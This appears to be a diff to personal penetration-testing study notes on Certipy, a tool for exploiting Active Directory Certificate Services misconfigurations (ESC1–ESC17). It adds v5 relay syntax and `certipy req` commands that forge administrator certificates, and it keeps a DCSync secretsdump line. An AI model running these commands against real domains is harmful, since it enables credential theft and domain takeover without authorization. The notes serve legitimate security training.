@@ -2,7 +2,7 @@
 
 **Tags:** `#certipy` `#adcs` `#activedirectory` `#certificateservices` `#esc` `#privesc` `#lateralmovement` `#domainadmin`
 
-Python tool for enumerating and exploiting Active Directory Certificate Services (AD CS) misconfigurations. Covers ESC1–ESC13 attack paths — certificate template abuse, CA misconfigurations, relay attacks, and more. AD CS vulnerabilities are extremely common in enterprise environments and often provide a direct path to Domain Admin.
+Python tool for enumerating and exploiting Active Directory Certificate Services (AD CS) misconfigurations. As of **v5.x** it identifies and exploits **ESC1–ESC17** — certificate template abuse, CA misconfigurations, relay attacks, and more. AD CS vulnerabilities are extremely common in enterprise environments and often provide a direct path to Domain Admin.
 
 **Source:** https://github.com/ly4k/Certipy
 **Install:**
@@ -20,7 +20,7 @@ certipy -h
 
 > [!note] The companion tool **Certify** (C# — Windows) is also commonly used. Certipy is the Linux equivalent and handles most of the same attacks. For Windows targets, Certify can be run directly on the host.
 
-> [!note] **See also** — [[Services/Active Directory/ADCS|ADCS]] for the full ESC1–ESC16 attack methodology this tool is used against. Also [[Class notes/HTB Academy/CPTS v2 (claude)/Windows Priv Esc|Windows Priv Esc]] (CPTS v2) — AD CS ESC1-ESC13 paths from a low-priv domain user.
+> [!note] **See also** — [[Services/Active Directory/ADCS|ADCS]] for the full ESC1–ESC16 attack methodology this tool is used against. Also [[Class notes/HTB Academy/CPTS v2 (claude)/Windows Priv Esc|Windows Priv Esc]] (CPTS v2) — AD CS ESC paths from a low-priv domain user. [[Tools/AD/BloodHound|BloodHound]] surfaces the enroll/`ADCS`-related edges that point you at a template; the Windows counterparts are [[Tools/AD/Certify|Certify]] (enum/request) and [[Tools/AD/PKINITtools|PKINITtools]] (manual PKINIT when you want Certipy's `auth` steps split out).
 
 ---
 
@@ -40,6 +40,11 @@ certipy -h
 | ESC10 | Weak certificate mapping — UserPrincipalName | GenericWrite on target user |
 | ESC11 | NTLM relay to ICPR (RPC enrollment) | Network position for relay |
 | ESC13 | Group-linked template issuance policy | Enroll rights on template |
+| ESC14 | Weak explicit mapping — write to `altSecurityIdentities` | Write on target's `altSecurityIdentities` |
+| ESC15 | v1 template application-policies injection (CVE-2024-49019 "EKUwu") | Enroll rights on a v1 (schema v1) template |
+| ESC16 | Security extension disabled CA-wide (global ESC9) | Any valid enrollment on affected CA |
+
+> [!note] **Version.** Confirm with `certipy version`. v5.x also supports **ESC17**; the table lists the ones you'll actually hit. Full methodology + prerequisites for every ESC lives in [[Services/Active Directory/ADCS|ADCS]] — Certipy is the *tool*, that note is the *playbook*.
 
 ---
 
@@ -221,9 +226,13 @@ certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
 
 Relay NTLM authentication to the AD CS web enrollment endpoint (`/certsrv/`). Capture a machine account certificate, then use it for privilege escalation via S4U2Self or DCSync.
 
+> [!warning] **v5 changed the relay flag.** It's no longer `-ca <ip>`. Use **`-target <protocol>://<host>`**: `http://` for the web-enrollment endpoint (ESC8), `rpc://` for the RPC endpoint (ESC11). `-ca` now only names the CA for the RPC (ESC11) path.
+
 ```bash
-# Step 1 — Start Certipy relay listener
-certipy relay -ca 10.10.10.10 -template DomainController
+# Step 1 — Start Certipy relay listener (ESC8 = HTTP web enrollment)
+certipy relay -target http://10.10.10.10 -template DomainController
+# ESC11 (RPC/ICPR) instead:
+# certipy relay -target rpc://10.10.10.10 -ca CORP-CA
 
 # Step 2 — Trigger NTLM auth from target machine (separate terminal)
 # Use PetitPotam, Coercer, or Responder to coerce DC auth
@@ -236,6 +245,25 @@ certipy auth -pfx dc01.pfx -dc-ip 10.10.10.10
 
 # Use DC$ hash for DCSync
 secretsdump.py -hashes ':dc_hash' 'CORP/DC01$@10.10.10.10'
+```
+
+---
+
+## Newer template flags (ESC9 / ESC10 / ESC15)
+
+`certipy req` gained flags for the SID-mapping and application-policy paths:
+
+```bash
+# ESC9 / ESC10 — embed a target's Object SID in the cert SAN (weak/absent mapping)
+certipy req -u jsmith@corp.local -p 'Password123!' -dc-ip 10.10.10.10 \
+  -ca CORP-CA -template ESC9Template \
+  -upn administrator@corp.local -sid <administrator-SID>
+
+# ESC15 (CVE-2024-49019 "EKUwu") — inject application policies into a schema-v1 template
+# to smuggle a Client Authentication / Certificate-Request-Agent EKU
+certipy req -u jsmith@corp.local -p 'Password123!' -dc-ip 10.10.10.10 \
+  -ca CORP-CA -template WebServer \
+  -application-policies 'Client Authentication' -upn administrator@corp.local
 ```
 
 ---
@@ -327,5 +355,5 @@ certipy cert -pfx output.pfx -pem cert.pem -key key.pem
 ---
 
 *Created: 2026-03-06*
-*Updated: 2026-08-18*
+*Updated: 2026-08-27*
 *Model: claude-opus-5*
